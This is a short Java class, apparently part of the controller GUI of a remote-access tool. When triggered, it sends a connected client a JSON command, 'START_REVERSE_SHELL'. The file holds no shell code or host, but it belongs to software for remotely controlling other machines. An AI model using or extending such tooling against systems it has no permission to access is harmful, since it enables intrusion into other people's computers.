package GUI.TableUtils.ReverseShell.Events;

import GUI.TableUtils.ReverseShell.ReverseShellGUI;
import Information.AbstractEvent;
import org.json.JSONObject;

import java.io.IOException;

public class StartShellEvent extends AbstractEvent<ReverseShellGUI> {
    public StartShellEvent(ReverseShellGUI guiManager) {
        super(guiManager);
    }

    @Override
    public void run() {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("ACTION", "START_REVERSE_SHELL");
        try {
            getClient().sendString(jsonObject.toString());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
